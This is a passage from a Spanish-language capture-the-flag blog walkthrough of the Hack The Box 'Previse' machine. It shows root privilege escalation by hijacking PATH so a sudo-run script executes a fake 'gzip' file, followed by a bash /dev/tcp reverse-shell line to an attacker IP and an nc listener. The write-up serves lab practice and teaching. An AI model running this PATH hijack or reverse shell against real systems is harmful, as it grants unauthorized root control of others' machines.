Creamos nuestro archivo `gzip` malicioso, como prueba inicial dig√°mosle que ejecute el comando `id` y su resultado lo guarde en el archivo `/tmp/testt/id.txt`:

```bash
m4lwhere@previse:/tmp/testt$ echo "id > /tmp/testt/id.txt" > gzip
m4lwhere@previse:/tmp/testt$ cat gzip 
id > /tmp/testt/id.txt
```

Le damos permisos de ejecuci√≥n:

```bash
m4lwhere@previse:/tmp/testt$ chmod +x gzip
```

Ya tendr√≠amos el ejecutable, ahora modifiquemos el `PATH`...

Agregamos `/tmp/testt` al inicio del `PATH` y concatenamos el valor actual del mismo:

```bash
m4lwhere@previse:/tmp/testt$ export PATH=/tmp/testt:$PATH
m4lwhere@previse:/tmp/testt$ echo $PATH
/tmp/testt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

Peeeerrrfesto, ya lo √∫nico ser√≠a ejecutar la instrucci√≥n que invoca el binario `gzip`, en este caso el script, peeeero con ayuda de sudo, as√≠ toda la ejecuci√≥n seria como el usuario `root`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_m4lwhereSH_gzipHIJACKING_idTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

YYYYYYYYYYY si sisisisiii, estamos ejecutando comandos en el sistema como el usuario `root` :D entabl√©monos una reverse shell:

> üëÅÔ∏è‚Äçüó®Ô∏è **OJO** (***podemos obtener una Shell como `root` de muuuchas formas con este vector, ya queda en tu imaginaci√≥n***)

Modificamos el archivo `gzip`:

```bash
m4lwhere@previse:/tmp/testt$ echo "bash -i >& /dev/tcp/10.10.14.93/4434 0>&1" > gzip 
m4lwhere@previse:/tmp/testt$ cat gzip 
bash -i >& /dev/tcp/10.10.14.93/4434 0>&1
```

Nos ponemos en escucha por el puerto `4434`:

```bash
‚ù± nc -lvp 4434
```

Ejecutamos el script yyyy ü•Å:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373bash_rootRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

OBTENEMOS UNA SHELL COMO `root`, tamos tamos que tamoooos!!

Ya podr√≠amos ver las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/previse/373flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

fffffffffinalizau'

...

Bonita explotaci√≥n, el inspeccionar c√≥digo y buscar el fallo me gusto bastante.

Como siempre, una buena canci√≥n y a  s e g u i r rompiendo t o d o!!